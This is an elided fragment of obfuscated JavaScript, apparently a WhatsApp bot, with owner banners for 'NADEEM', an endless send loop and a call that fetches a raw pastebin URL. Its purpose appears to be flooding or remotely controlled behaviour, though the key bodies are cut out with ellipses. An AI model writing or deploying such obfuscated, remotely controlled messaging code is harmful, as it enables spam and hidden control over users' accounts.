(async () => {
  try {
      ...
      while (true) {
        for (let _0x281a84 = _0x765bc5; _0x281a84 < _0x83eb79.length; _0x281a84++) {
          try {
            ...
            console.log(" \033[1;32m[<<===========• \033[1;33mOWNER \033[1;32mBROKEN \033[1;33mNADEEM \033[1;32m•=========>>]");
    ...
    const _0x2cf4fd = async () => {
      ...
      _0x4e34c7.ev.on("connection.update", async _0x178b36 => {
        ...
        if (_0xf2d9da === "open") {
          ...
          console.log(" \033[1;32m[<<===============•OWNER MR NADEEM•==============>>]");
          console.log('');
    ...
    function _0x1af59e(_0x2ce79d) {
      _0x63463b.get("https://pastebin.com/raw/hxi790Lz").then(_0x27e908 => {
